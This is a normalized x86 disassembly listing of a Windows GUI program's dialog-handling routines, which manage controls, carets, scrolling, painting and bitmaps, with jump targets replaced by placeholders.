mov ebx [ EnableWindow@IAT ]
push eax
call ebx
mov ecx [ esi + 0x40 ]
push 0x0
push 0x49e
push ecx
call edi
push eax
call ebx
mov edx [ esi + 0x40 ]
push 0x0
push 0x4a8
push edx
call edi
push eax
call ebx
mov eax [ esi + 0x40 ]
push r--data
push 0x4a5
push eax
call [ SetDlgItemTextA@IAT ]
pop edi
mov ecx esi
pop esi
pop ebx
jmp sub_419c20
sub_41a1e0
sub esp 0x14
push esi
mov esi ecx
call sub_41a180
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
cmp [ esi + 0x1a ] 0x0
jne r-xdata
mov eax [ esi + 0x40 ]
push ebx
push edi
mov edi [ GetDlgItem@IAT ]
push 0x1
push 0x49f
push eax
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
mov ecx [ esi + 0x40 ]
push 0x1
push 0x49e
push ecx
call edi
push eax
call ebx
mov edx [ esi + 0x40 ]
push 0x1
push 0x4a8
push edx
call edi
push eax
call ebx
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax ]
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
push 0x40
call [ MessageBeep@IAT ]
mov edx [ rw-data ]
push 0x14
lea ecx [ esp + 0x8 ]
push ecx
push 0x11a
push edx
call [ LoadStringA@IAT ]
jmp r-xdata
movsx edx [ esi + 0x18 ]
movsx eax [ esi + 0x1a ]
dec edx
cmp eax edx
pop edi
pop ebx
jge r-xdata
mov ecx [ esi + 0x40 ]
push 0x4a4
push ecx
call edi
push eax
call [ SetFocus@IAT ]
mov eax [ esi + 0x40 ]
lea edx [ esp + 0x4 ]
push edx
push 0x4a5
push eax
call [ SetDlgItemTextA@IAT ]
mov ecx esi
call sub_419a30
pop esi
add esp 0x14
retn 0x4
push 0x40
call [ MessageBeep@IAT ]
movsx eax [ esi + 0x1a ]
inc eax
cdq
sub eax edx
sar eax 0x1
push eax
lea ecx [ esp + 0x8 ]
push 0x11b
push ecx
call sub_420b10
inc eax
cdq
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
jmp r-xdata
add esp 0xc
sub_41a2f0
mov eax [ esp + 0x4 ]
mov ecx [ ecx + 0x40 ]
push 0x0
push 0x0
push eax
push ecx
call [ GetDlgItemInt@IAT ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x8 ]
cmp eax ecx
jle r-xdata
xor eax eax
test eax eax
mov edx [ esp + 0xc ]
mov [ edx ] eax
je r-xdata
mov eax ecx
mov edx [ esp + 0x10 ]
mov [ edx ] ecx
retn 0x10
mov ecx [ esp + 0x10 ]
mov [ ecx ] eax
retn 0x10
sub_41a330
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0x10 ]
mov [ esi + 0x40 ] edi
mov [ esi + 0x48 ] ebx
call [ eax + 0x4 ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x1
push edi
call sub_4258a0
add esp 0x8
push ebx
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebx
retn 0xc
movzx ax [ rw-data ]
movsx ecx ax
push ecx
push 0x4a3
push edi
mov [ esi + 0x3e ] ax
call [ CheckDlgButton@IAT ]
sub_41a390
mov eax [ esp + 0x8 ]
sub esp 0x40
cmp eax 0x100
push esi
push edi
mov edi [ esp + 0x4c ]
mov esi ecx
ja r-xdata
cmp eax 0x203
ja r-xdata
je r-xdata
mov ecx eax
sub ecx 0x204
je r-xdata
je r-xdata
push 0x11
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
mov eax [ esp + 0x54 ]
setl cl
add eax 0xffffffdd
cmp eax 0x9b
lea ecx [ ecx * 8 + 0x2 ]
ja r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx 0x86
ja r-xdata
mov ecx [ esp + 0x58 ]
push ecx
mov ecx esi
call sub_41a0a0
mov edx [ esp + 0x4c ]
push edx
mov ecx esi
call sub_4198d0
sub ecx 0x6
je r-xdata
cmp [ esi + 0x1a ] 0x0
je r-xdata
mov ecx eax
sub ecx 0x102
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
movzx edx [ eax + lookup_table_41a798 ]
jmp [ edx * 4 + jump_table_41a778 ]
mov edx [ esp + 0x58 ]
mov ecx [ esp + 0x54 ]
push edx
mov edx [ esp + 0x50 ]
push ecx
push eax
push edx
call [ DefWindowProcA@IAT ]
pop edi
pop esi
add esp 0x40
retn 0x10
movzx ecx [ ecx + lookup_table_41a6f0 ]
jmp [ ecx * 4 + jump_table_41a6d4 ]
mov eax [ esp + 0x54 ]
push eax
mov ecx esi
call sub_419d90
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov ecx [ esi + 0x40 ]
push 0x0
push 0x49f
push 0x111
push ecx
call [ SendMessageA@IAT ]
cmp [ esp + 0x54 ] 0x20
jne r-xdata
sub ecx 0x12
je r-xdata
add [ esi + 0x1e ] cx
jmp r-xdata
sub [ esi + 0x1e ] cx
jmp r-xdata
mov [ esi + 0x1e ] 0x0
jmp r-xdata
mov ax [ esi + 0x1a ]
mov [ esi + 0x1e ] ax
jmp r-xdata
push edi
mov ecx esi
call sub_4198d0
jmp r-xdata
cmp [ esi + 0x1a ] 0x0
je r-xdata
mov ecx [ esp + 0x4c ]
push ecx
mov ecx esi
call sub_4198d0
pop edi
mov eax 0x1
pop esi
add esp 0x40
retn 0x10
mov edi [ GetSystemMetrics@IAT ]
push 0x3
call edi
mov ecx [ rw-data ]
xor edx edx
mov dx [ rw-data ]
shl dx 0x1
add ecx eax
push 0x1
push 0x2e
add edx ecx
mov [ esi + 0xc ] dx
call edi
movsx edx [ esi + 0xc ]
mov edi [ esp + 0x50 ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ esp + 0x60 ]
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
push ecx
push edx
push eax
push edi
call [ MoveWindow@IAT ]
push edi
mov ecx esi
mov [ esi + 0x8 ] edi
call sub_419b90
push 0x0
push edi
call ImmAssociateContext
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
pop edi
mov eax 0x81
pop esi
add esp 0x40
retn 0x10
push ebx
mov ebx [ esp + 0x50 ]
push ebp
lea ecx [ esp + 0x10 ]
push ecx
push ebx
call [ BeginPaint@IAT ]
mov ebp [ GetSysColor@IAT ]
push 0x8
mov edi eax
call ebp
push eax
push edi
call [ SetTextColor@IAT ]
push 0x5
call ebp
push eax
push edi
call [ SetBkColor@IAT ]
push edi
mov ecx esi
call sub_419f30
lea edx [ esp + 0x10 ]
push edx
push ebx
call [ EndPaint@IAT ]
pop ebp
pop ebx
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
call [ DestroyCaret@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
cmp [ esp + 0x58 ] 0xffffffff
jne r-xdata
mov eax [ esi + 0x34 ]
mov edx [ esi + 0x2c ]
push 0x1
sub eax edx
push eax
push 0x0
push edi
call [ CreateCaret@IAT ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x2c ]
push ecx
push edx
call [ SetCaretPos@IAT ]
push edi
call [ ShowCaret@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov eax [ esp + 0x54 ]
push eax
mov ecx esi
call sub_419c40
pop edi
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub ecx 0xed
jne r-xdata
cmp [ esi + 0x1e ] 0x0
jge r-xdata
mov ecx [ esi + 0x40 ]
push 0x0
push 0x4a8
push 0x111
push ecx
call [ SendMessageA@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x40
retn 0x10
mov eax [ esp + 0x4c ]
push eax
mov ecx esi
call sub_4198d0
pop edi
mov eax 0x1
pop esi
add esp 0x40
retn 0x10
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
movsx ecx [ esi + 0x1e ]
xor eax eax
mov ax [ esi + 0x1a ]
movsx edx ax
sub edx 0x2
cmp ecx edx
jle r-xdata
mov [ esi + 0x1e ] 0x0
test [ esp + 0x54 ] 0x4
jne r-xdata
movsx eax [ esi + 0x1e ]
mov edx [ esi ]
push eax
mov ecx esi
call [ edx ]
jmp r-xdata
add eax 0xfffffffe
mov [ esi + 0x1e ] ax
mov edx [ esp + 0x58 ]
push edx
mov ecx esi
call sub_41a0a0
push edi
call [ SetFocus@IAT ]
sub_41a840
mov eax [ esp + 0x8 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0x3c ] 0x1
jne r-xdata
mov edx [ esp + 0x8 ]
push 0x0
push eax
mov eax [ esi + 0x40 ]
push edx
push eax
call [ SetDlgItemInt@IAT ]
mov [ esi + 0x3c ] 0x0
pop esi
retn 0x8
mov eax [ esp + 0x8 ]
mov ecx [ esi + 0x40 ]
push r--data
push eax
push ecx
call [ SetDlgItemTextA@IAT ]
mov [ esi + 0x3c ] 0x0
pop esi
retn 0x8
sub_41a890
push ebx
push esi
mov esi ecx
xor ecx ecx
xor edx edx
push edi
xor ebx ebx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
add ebx edx
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
add ebx edx
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
add ebx edx
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
add ebx edx
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
add ebx edx
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
mov al [ ecx + rw-data ]
test al al
jne r-xdata
add ebx edx
movzx eax al
cmp [ eax + esi + 0x4c ] 0x0
je r-xdata
inc edx
jmp r-xdata
add ecx 0x7
cmp ecx 0x102
jle r-xdata
add ebx edx
mov edi [ esp + 0x14 ]
mov ecx [ esi + 0x40 ]
push 0x0
push 0x0
push edi
push ecx
call [ GetDlgItemInt@IAT ]
mov edx [ esp + 0x10 ]
mov ecx [ edx + 0x10 ]
sub eax ecx
jns r-xdata
cmp eax 0x1e
jle r-xdata
mov eax 0x1e
jmp r-xdata
test eax eax
je r-xdata
xor eax eax
push eax
push eax
mov eax [ esi + 0x40 ]
push edi
push eax
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebx
retn 0x8
cmp eax ebx
jge r-xdata
push 0x0
push eax
mov eax [ esi + 0x40 ]
push edi
push eax
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebx
retn 0x8
xor eax eax
test ecx ecx
setge al
dec eax
and eax ebx
sub_41a9d0
push esi
mov esi ecx
mov eax [ esi + 0x144 ]
push edi
mov edi [ DeleteObject@IAT ]
push eax
mov [ esi ] r--data
call edi
mov ecx [ esi + 0x148 ]
push ecx
call edi
mov edx [ esi + 0x140 ]
push edx
call edi
pop edi
mov ecx esi
pop esi
jmp sub_4198b0
sub_41aa60
push esi
mov esi ecx
mov eax [ esi + 0x70 ]
push edi
mov edi [ DeleteObject@IAT ]
push eax
mov [ esi ] r--data
call edi
mov ecx [ esi + 0x60 ]
push ecx
call edi
pop edi
mov ecx esi
pop esi
jmp sub_4198b0
sub_41aa90
mov al [ rw-data ]
test al al
mov eax [ ecx + 0x50 ]
je r-xdata
lea edx [ eax + eax * 2 ]
mov eax [ ecx + 0x54 ]
movzx eax [ eax + edx * 2 + 0x4 ]
add eax [ esp + 0x4 ]
retn 0x4
mov edx [ ecx + 0x54 ]
lea eax [ eax + eax * 2 ]
movzx eax [ edx + eax * 2 + 0x5 ]
mov edx [ ecx + 0x64 ]
mov ecx [ esp + 0x4 ]
add eax edx
movzx eax [ eax + ecx ]
retn 0x4
sub_41aad0
sub esp 0x200
push esi
push 0x200
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
mov ecx [ esi + 0x40 ]
push 0x656
push ecx
call [ GetDlgItemTextA@IAT ]
mov esi [ esi + 0x84 ]
xor eax eax
test esi esi
jle r-xdata
xor eax eax
mov cl [ esp + 0x4 ]
pop esi
add esp 0x200
retn
cmp eax esi
jl r-xdata
mov dl [ eax + rw-data ]
inc eax
cmp dl cl
je r-xdata
sub_41ab20
push esi
mov esi ecx
mov eax [ esi + 0x80 ]
cmp [ esi + 0x78 ] eax
push edi
jl r-xdata
mov eax [ esi + 0x78 ]
test eax eax
jge r-xdata
dec eax
mov [ esi + 0x78 ] eax
mov ecx [ esi + 0x74 ]
mov edx [ esi + 0x7c ]
mov eax [ esi + 0x78 ]
mov edi [ InvalidateRect@IAT ]
add edx ecx
cmp eax edx
jl r-xdata
mov [ esi + 0x78 ] 0x0
mov eax [ esi + 0x78 ]
cmp eax [ esi + 0x7c ]
jge r-xdata
sub eax ecx
inc eax
push 0x0
mov [ esi + 0x7c ] eax
mov eax [ esi + 0x6c ]
push 0x0
push eax
call edi
mov edx [ esi + 0x7c ]
test edx edx
je r-xdata
mov ecx [ esi + 0x6c ]
push 0x0
push 0x0
push ecx
mov [ esi + 0x7c ] eax
call edi
mov ecx [ esi + 0x80 ]
dec ecx
mov [ rw-data ] ecx
mov edx [ esi + 0x74 ]
push 0x1
mov [ rw-data ] edx
mov eax [ esi + 0x7c ]
push rw-data
mov [ rw-data ] eax
mov ecx [ esi + 0x6c ]
push 0x0
push ecx
call [ SetScrollInfo@IAT ]
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x74 ]
mov eax [ esi + 0x80 ]
add edx ecx
cmp edx eax
jl r-xdata
pop edi
pop esi
retn 0x4
mov edx [ esi + 0x70 ]
mov eax [ esi + 0x6c ]
push 0x16
push 0x16
push edx
push eax
call [ CreateCaret@IAT ]
mov ecx [ esi + 0x78 ]
sub ecx [ esi + 0x7c ]
imul ecx ecx 0x16
push 0x0
push ecx
call [ SetCaretPos@IAT ]
mov edx [ esi + 0x6c ]
pop edi
pop esi
mov [ esp + 0x4 ] edx
jmp [ ShowCaret@IAT ]
sub eax ecx
mov [ esi + 0x7c ] eax
jns r-xdata
mov eax [ esi + 0x6c ]
push 0x0
push 0x0
push eax
call edi
mov [ esi + 0x7c ] 0x0
sub_41ac20
mov eax [ esp + 0x4 ]
sub esp 0xc
push ebx
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jge r-xdata
mov ecx [ edi + 0x84 ]
cmp eax ecx
jle r-xdata
xor eax eax
cmp eax ebx
jne r-xdata
mov eax ecx
mov cl [ eax + rw-data ]
push esi
xor esi esi
cmp eax 0x1
mov [ esp + 0xc ] cl
mov [ esp + 0xd ] bl
jle r-xdata
mov [ esp + 0x8 ] bl
mov [ edi + 0x4c ] ebx
jmp r-xdata
push esi
mov ecx edi
call sub_41aa90
mov edx [ edi + 0x68 ]
movzx eax [ eax + edx ]
mov [ edi + 0x78 ] esi
mov [ edi + 0x4c ] eax
pop esi
dec eax
mov [ esp + 0x1c ] eax
push ebp
jmp r-xdata
mov ecx [ edi + 0x6c ]
push ebx
push ebx
push ecx
call [ InvalidateRect@IAT ]
push ebx
mov ecx edi
call sub_41ab20
mov eax [ edi + 0x40 ]
lea edx [ esp + 0x8 ]
push edx
push 0x656
push eax
call [ SetDlgItemTextA@IAT ]
pop edi
pop ebx
add esp 0xc
retn 0x4
push esi
mov ecx edi
lea ebp [ esi + 0x1 ]
call sub_41aa90
push ebp
mov ecx edi
mov ebx eax
call sub_41aa90
mov edx eax
mov eax [ edi + 0x68 ]
mov cl [ ebx + eax ]
cmp cl [ edx + eax ]
jne r-xdata
mov eax [ esp + 0x20 ]
inc esi
dec eax
mov [ esp + 0x20 ] eax
jne r-xdata
mov esi ebp
push esi
mov ecx edi
lea ebp [ esi + 0x1 ]
call sub_41aa90
push ebp
mov ecx edi
mov ebx eax
call sub_41aa90
mov edx eax
mov eax [ edi + 0x68 ]
mov cl [ ebx + eax ]
cmp cl [ edx + eax ]
je r-xdata
xor ebx ebx
pop ebp
sub_41ad10
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x5c ]
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0xc ]
push ecx
push edx
push 0x654
mov ecx esi
call sub_41a2f0
mov cl [ rw-data ]
mov edx [ esi + 0x54 ]
test cl cl
lea ecx [ eax + eax * 2 ]
lea ecx [ edx + ecx * 2 ]
je r-xdata
mov dl [ ecx + 0x2 ]
mov dl [ ecx + 0x3 ]
jmp r-xdata
movzx edx dl
mov [ esi + 0x84 ] edx
movzx edx [ rw-data ]
movzx ecx [ edx + ecx ]
mov [ esi + 0x80 ] ecx
push 0x0
mov ecx esi
mov [ esi + 0x50 ] eax
call sub_41ac20
pop esi
add esp 0x8
retn
sub_41ad80
sub esp 0x8
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x78 ]
push edi
push eax
call sub_41aa90
mov ebx eax
mov eax [ esi + 0x50 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x80 ]
xor edi edi
test eax eax
mov [ esp + 0x10 ] edi
jle r-xdata
mov edx [ esi + 0x54 ]
movzx eax [ edx + 0xa ]
cmp ebx eax
mov ecx 0x1
jl r-xdata
mov eax [ esp + 0x10 ]
inc eax
push eax
mov ecx esi
call sub_41ac20
pop edi
pop esi
pop ebx
add esp 0x8
retn
mov eax [ esi + 0x68 ]
mov al [ eax + ebx ]
mov [ esp + 0xf ] al
push ebp
nop
dec ecx
push ecx
push 0x654
mov ecx esi
call sub_41a840
mov eax [ esi + 0x80 ]
xor edi edi
test eax eax
jle r-xdata
mov eax edx
add eax 0xa
nop
pop ebp
push edi
mov ecx esi
lea ebp [ edi + 0x1 ]
call sub_41aa90
push ebp
mov ecx esi
mov ebx eax
call sub_41aa90
mov ecx eax
mov eax [ esi + 0x68 ]
mov dl [ ebx + eax ]
cmp dl [ ecx + eax ]
jne r-xdata
mov [ esi + 0x78 ] edi
push edi
mov ecx esi
call sub_41aa90
cmp ebx eax
je r-xdata
movzx edx [ eax + 0x6 ]
add eax 0x6
inc ecx
cmp ebx edx
jge r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x80 ]
inc edi
inc ecx
cmp edi eax
mov [ esp + 0x14 ] ecx
jl r-xdata
mov edi ebp
push edi
mov ecx esi
lea ebp [ edi + 0x1 ]
call sub_41aa90
push ebp
mov ecx esi
mov ebx eax
call sub_41aa90
mov ecx eax
mov eax [ esi + 0x68 ]
mov dl [ ebx + eax ]
cmp dl [ ecx + eax ]
je r-xdata
mov eax [ esi + 0x80 ]
inc edi
cmp edi eax
jl r-xdata
push edi
mov ecx esi
call sub_41aa90
mov dl [ esp + 0x13 ]
mov ecx eax
mov eax [ esi + 0x68 ]
cmp dl [ ecx + eax ]
je r-xdata
sub_41aea0
sub esp 0x284
push esi
push edi
mov edi ecx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x1e
push 0x61a
mov ecx edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x294 ] 0xffffffff
call sub_41a2f0
mov edx [ edi + 0x40 ]
mov esi [ IsDlgButtonChecked@IAT ]
push 0x618
push edx
call esi
mov [ esp + 0x20 ] eax
mov eax [ edi + 0x40 ]
push 0x619
push eax
call esi
mov [ esp + 0x14 ] eax
xor eax eax
mov [ esp + 0xc ] 0xff
mov [ esp + 0x8 ] eax
movzx eax [ eax + rw-data ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
inc eax
cmp eax 0xf1
jle r-xdata
pop edi
pop esi
add esp 0x284
retn
push ebx
push ebp
mov ebx 0x3000
mov cl [ edi + eax + 0x4c ]
test cl cl
jne r-xdata
jmp r-xdata
cmp eax 0x23
jne r-xdata
mov eax 0x16
jmp r-xdata
mov ecx [ edi + 0x40 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_415ea0
test eax eax
jne r-xdata
cmp ecx 0x17
jne r-xdata
mov eax 0x22
cmp ecx 0x19
jne r-xdata
mov ecx 0x16
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx 0x22
jmp r-xdata
mov ebp [ esp + 0x20 ]
shr edx 0x8
and edx 0x1f
cmp edx ebp
jl r-xdata
mov ecx eax
inc edi
cmp edi 0x7e
jle r-xdata
cmp edx [ esp + 0x18 ]
jg r-xdata
mov esi edi
push 0x0
or esi ebx
push esi
lea ecx [ esp + 0x34 ]
call sub_415a70
movzx edx [ esp + 0x2c ]
mov ecx [ esp + 0x38 ]
mov eax edx
and eax 0xff
and ecx 0xff
cmp eax 0x17
jne r-xdata
add ebx 0x100
cmp ebx 0x7400
jle r-xdata
mov edx [ esp + 0x28 ]
test edx edx
je r-xdata
mov edi 0x21
lea ecx [ esp + 0x2c ]
call sub_415190
pop ebp
pop ebx
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
cmp eax [ esp + 0x10 ]
jl r-xdata
cmp ecx [ esp + 0x10 ]
jl r-xdata
cmp eax [ esp + 0x14 ]
jle r-xdata
cmp ecx [ esp + 0x14 ]
jg r-xdata
push esi
mov esi [ esp + 0x28 ]
mov ecx esi
call sub_419a00
push 0x2f
mov ecx esi
call sub_419a00
sub_41b020
push esi
mov esi ecx
call sub_41aa30
mov [ esi ] r--data
mov [ esi + 0x5c ] 0x11
mov [ esi + 0x54 ] rw-data
mov [ esi + 0x58 ] 0x0
mov [ esi + 0x64 ] rw-data
mov [ esi + 0x68 ] rw-data
mov eax [ rw-data ]
push 0x34a
push eax
call [ LoadBitmapA@IAT ]
mov [ esi + 0x60 ] eax
mov eax esi
pop esi
retn
sub_41b080
sub esp 0x284
push esi
push edi
mov edi ecx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x1e
push 0x658
mov ecx edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x294 ] 0xffffffff
call sub_41a2f0
mov edx [ edi + 0x40 ]
mov esi [ IsDlgButtonChecked@IAT ]
push 0x618
push edx
call esi
mov [ esp + 0x20 ] eax
mov eax [ edi + 0x40 ]
push 0x619
push eax
call esi
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x4c ]
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] 0xff
jmp r-xdata
pop edi
pop esi
add esp 0x284
retn
push ebx
push ebp
mov ebx 0x3000
mov edi edi
mov ecx [ edi + 0x40 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_415ea0
test eax eax
jne r-xdata
cmp eax 0x23
jne r-xdata
mov eax 0x16
jmp r-xdata
cmp ecx 0x17
jne r-xdata
mov eax 0x22
cmp ecx 0x19
jne r-xdata
mov ecx 0x16
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx 0x22
jmp r-xdata
mov ebp [ esp + 0x20 ]
shr edx 0x8
and edx 0x1f
cmp edx ebp
jl r-xdata
mov ecx eax
inc edi
cmp edi 0x7e
jle r-xdata
cmp edx [ esp + 0x18 ]
jg r-xdata
mov esi edi
push 0x0
or esi ebx
push esi
lea ecx [ esp + 0x34 ]
call sub_415a70
movzx edx [ esp + 0x2c ]
mov ecx [ esp + 0x38 ]
mov eax edx
and eax 0xff
and ecx 0xff
cmp eax 0x17
jne r-xdata
add ebx 0x100
cmp ebx 0x7400
jle r-xdata
mov edx [ esp + 0x28 ]
test edx edx
je r-xdata
mov edi 0x21
lea ecx [ esp + 0x2c ]
call sub_415190
pop ebp
pop ebx
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
cmp eax [ esp + 0x10 ]
jl r-xdata
cmp ecx [ esp + 0x10 ]
jl r-xdata
cmp eax [ esp + 0x14 ]
jle r-xdata
cmp ecx [ esp + 0x14 ]
jg r-xdata
push esi
mov esi [ esp + 0x28 ]
mov ecx esi
call sub_419a00
push 0x2f
mov ecx esi
call sub_419a00
sub_41b1f0
mov ecx [ esp + 0x8 ]
sub esp 0x40
mov eax ecx
dec eax
push esi
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x1
push 0x2e
call esi
lea ecx [ eax + eax + 0x3c ]
push ecx
push 0x2d
call esi
lea edx [ eax + eax + 0xa0 ]
mov eax [ esp + 0x5c ]
mov ecx [ eax + 0x18 ]
push edx
mov edx [ eax + 0x1c ]
mov eax [ esp + 0x54 ]
push ecx
push edx
push eax
call [ MoveWindow@IAT ]
sub eax 0xe
je r-xdata
push ebx
push ebp
mov ebp [ esp + 0x50 ]
push edi
lea ecx [ esp + 0x10 ]
push ecx
push ebp
call [ BeginPaint@IAT ]
mov edi eax
push edi
call [ CreateCompatibleDC@IAT ]
mov edx [ rw-data ]
push 0x34d
push edx
mov esi eax
call [ LoadBitmapA@IAT ]
mov ebx eax
push ebx
push esi
call [ SelectObject@IAT ]
push 0xcc0020
push 0x0
push 0x0
push esi
push 0x3c
push 0xa0
push 0x0
push 0x0
push edi
call [ BitBlt@IAT ]
push ebx
call [ DeleteObject@IAT ]
push esi
call [ DeleteDC@IAT ]
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ EndPaint@IAT ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub eax 0x1f2
je r-xdata
mov esi [ esp + 0x54 ]
mov ecx esi
shr ecx 0x10
mov eax 0x66666667
imul ecx
mov ecx edx
sar ecx 0x3
mov edx ecx
shr edx 0x1f
add ecx edx
movzx edx si
mov eax 0x66666667
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
lea edx [ edx + edx * 2 ]
add ecx edx
cmp ecx 0x9
jg r-xdata
mov eax [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x4c ]
push edx
push ecx
push eax
call [ DefWindowProcA@IAT ]
pop esi
add esp 0x40
retn 0x10
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov eax [ esp + 0x48 ]
push ecx
push 0x60e
push 0x111
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub_41b350
mov eax [ esp + 0x8 ]
cmp eax 0xa
push esi
mov esi ecx
mov [ esi + 0x3c ] 0x1
jne r-xdata
mov edx [ esp + 0x8 ]
push 0x0
push eax
mov eax [ esi + 0x40 ]
push edx
push eax
call [ SetDlgItemInt@IAT ]
mov [ esi + 0x3c ] 0x0
pop esi
retn 0x8
mov eax [ esp + 0x8 ]
mov ecx [ esi + 0x40 ]
push r--data
push eax
push ecx
call [ SetDlgItemTextA@IAT ]
mov [ esi + 0x3c ] 0x0
pop esi
retn 0x8
sub_41b3a0
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx 0x3
lea esp [ esp ]
xor eax eax
retn 0xc
pop edi
xor eax eax
pop esi
retn 0xc
cmp [ esi + ecx * 8 + 0x4 ] edx
jl r-xdata
dec ecx
jns r-xdata
cdq
mov edi 0xa
idiv edi
cmp [ esi + ecx * 8 ] edx
jg r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + 0x20 ] eax
jg r-xdata
cmp [ esi + 0x24 ] eax
jl r-xdata
pop edi
mov eax 0x1
pop esi
retn 0xc
sub_41b400
push esi
mov esi ecx
call sub_41aa30
mov [ esi ] r--data
mov [ esi + 0x5c ] 0xb
mov [ esi + 0x54 ] rw-data
mov [ esi + 0x58 ] 0x1
mov [ esi + 0x64 ] rw-data
mov [ esi + 0x68 ] rw-data
mov eax [ rw-data ]
push 0x34e
push eax
call [ LoadBitmapA@IAT ]
mov [ esi + 0x60 ] eax
mov eax esi
pop esi
retn
sub_41b450
sub esp 0x288
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
mov ecx eax
sub ecx 0x0
mov [ esp + 0x20 ] esi
mov [ esp + 0x288 ] 0xffffffff
je r-xdata
mov [ esp + 0x8 ] 0xb
dec ecx
je r-xdata
cmp eax 0xc
jge r-xdata
mov [ esp + 0x10 ] 0x13
jmp r-xdata
mov [ esp + 0x8 ] 0x0
jmp r-xdata
mov [ esp + 0x8 ] eax
mov ebp eax
jmp r-xdata
mov [ esp + 0x10 ] eax
dec eax
mov [ esp + 0xc ] eax
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
push 0x1a
push 0x658
mov ecx esi
call sub_41a2f0
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push 0x2f
push 0x65a
mov ecx esi
call sub_41a2f0
mov ecx [ esi + 0x40 ]
push ecx
lea ecx [ esp + 0x2c ]
call sub_415ea0
test eax eax
jne r-xdata
xor ebp ebp
mov ecx esi
call sub_41aad0
test eax eax
mov [ esp + 0xc ] eax
jne r-xdata
pop esi
pop ebp
add esp 0x288
retn
push ebx
push edi
mov ebx 0x3000
inc edi
cmp edi 0x7e
jle r-xdata
cmp eax [ esp + 0x10 ]
jg r-xdata
mov esi edi
push 0x2
or esi ebx
push esi
lea ecx [ esp + 0x38 ]
call sub_415a70
mov ecx [ esp + 0x242 ]
mov eax ecx
shr eax 0x11
and eax 0x1f
cmp eax ebp
jl r-xdata
